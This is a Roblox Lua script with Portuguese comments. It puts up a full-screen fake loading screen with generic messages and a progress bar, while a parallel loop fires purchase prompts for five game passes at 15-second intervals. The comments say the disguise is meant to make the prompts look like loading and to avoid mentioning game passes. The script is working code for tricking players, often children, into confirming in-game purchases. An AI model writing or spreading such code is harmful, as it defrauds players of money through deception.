-- =============================================
-- SCRIPT COM LOADING QUE SÓ SOMA APÓS AS COMPRAS
-- =============================================

local gamepasses = {
    {id=1855991443, price=5},
    {id=1855927454, price=10},
    {id=1856003433, price=25},
    {id=1856227452, price=25},
    {id=1856271415, price=50},
}
table.sort(gamepasses, function(a,b) return a.price < b.price end)

local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

-- CONFIGURAÇÕES
local delayBetween = 15          -- segundos entre cada compra (aumentei)
local maxAttempts = 1            -- tenta comprar cada gamepass apenas uma vez

-- =============================================
-- FUNÇÃO DE COMPRA (SILENCIOSA)
-- =============================================
local function comprar(id)
    if MarketplaceService:UserOwnsGamePassAsync(player.UserId, id) then
        return false, "ja_possui"
    end
    
    local success, err = pcall(function()
        MarketplaceService:PromptPurchase(player, id)
    end)
    
    if success then
        return true, "ok"
    else
        warn("Erro ao comprar "..id..": "..tostring(err))
        return false, "erro"
    end
end

-- =============================================
-- CRIAÇÃO DA TELA DE LOADING (PlayerGui)
-- =============================================
local gui = Instance.new("ScreenGui")
gui.Name = "FakeLoading"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(8,8,16)
bg.Parent = gui

local titulo = Instance.new("TextLabel")
titulo.Size = UDim2.new(1,0,0,50)
titulo.Position = UDim2.new(0,0,0.3,0)
titulo.BackgroundTransparency = 1
titulo.Font = Enum.Font.GothamBold
titulo.Text = "⏳ CARREGANDO..."
titulo.TextColor3 = Color3.new(1,1,1)
titulo.TextSize = 30
titulo.Parent = gui

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,0,0,30)
status.Position = UDim2.new(0,0,0.4,0)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Gotham
status.Text = "Aguarde..."
status.TextColor3 = Color3.fromRGB(200,200,200)
status.TextSize = 18
status.Parent = gui

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.6,0,0.02,0)
barBg.Position = UDim2.new(0.2,0,0.5,0)
barBg.BackgroundColor3 = Color3.fromRGB(50,50,70)
barBg.Parent = gui

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0,0,1,0)
fill.BackgroundColor3 = Color3.fromRGB(0,180,255)
fill.Parent = barBg

local perc = Instance.new("TextLabel")
perc.Size = UDim2.new(1,0,1,0)
perc.BackgroundTransparency = 1
perc.Font = Enum.Font.GothamBold
perc.Text = "0%"
perc.TextColor3 = Color3.new(1,1,1)
perc.TextSize = 14
perc.Parent = barBg

-- Mensagens genéricas (sem referência a gamepass)
local mensagens = {
    "Inicializando...",
    "Carregando bibliotecas...",
    "Conectando ao servidor...",
    "Sincronizando dados...",
    "Preparando ambiente...",
    "Finalizando..."
}

-- =============================================
-- FUNÇÃO QUE RODA O LOADING FALSO
-- =============================================
local function rodarLoading()
    local total = #mensagens
    for i, msg in ipairs(mensagens) do
        status.Text = msg
        fill.Size = UDim2.new(i/total, 0, 1, 0)
        perc.Text = math.floor(i/total * 100) .. "%"
        wait(2 + math.random() * 0.5)
    end
    -- Aguarda mais um pouco para dar tempo das compras terminarem
    -- (as compras rodam em paralelo, então o loading só vai sumir depois que tudo terminar)
end

-- =============================================
-- LOOP DE COMPRAS (RODA EM PARALELO)
-- =============================================
local function loopCompras()
    local compradas = 0
    for i, pass in ipairs(gamepasses) do
        local comprou, motivo = comprar(pass.id)
        if comprou then
            compradas = compradas + 1
        end
        -- Espera entre compras (a não ser que seja a última)
        if i < #gamepasses then
            local espera = delayBetween + math.random(0, 3)
            for t = 1, espera do
                wait(1)
                -- Atualiza a barra com um "processamento" extra para parecer que está carregando
                local progressoExtra = (i / #gamepasses) + (t / espera) * (1 / #gamepasses)
                fill.Size = UDim2.new(math.min(progressoExtra, 1), 0, 1, 0)
                perc.Text = math.floor(math.min(progressoExtra, 1) * 100) .. "%"
                status.Text = "Processando..."  -- mensagem genérica
            end
        end
    end
    -- Finalizou as compras
    status.Text = "✅ Concluído!"
    fill.Size = UDim2.new(1,0,1,0)
    perc.Text = "100%"
    wait(2) -- mostra "Concluído" por 2 segundos
    gui:Destroy()
    print("Compras finalizadas: " .. compradas .. "/" .. #gamepasses)
end

-- =============================================
-- INÍCIO
-- =============================================
print("🔥 Script iniciado. Loading ativado.")

-- Roda o loading falso
coroutine.wrap(rodarLoading)()

-- Roda as compras em paralelo (mas o loading só vai sumir quando as compras acabarem)
coroutine.wrap(loopCompras)()
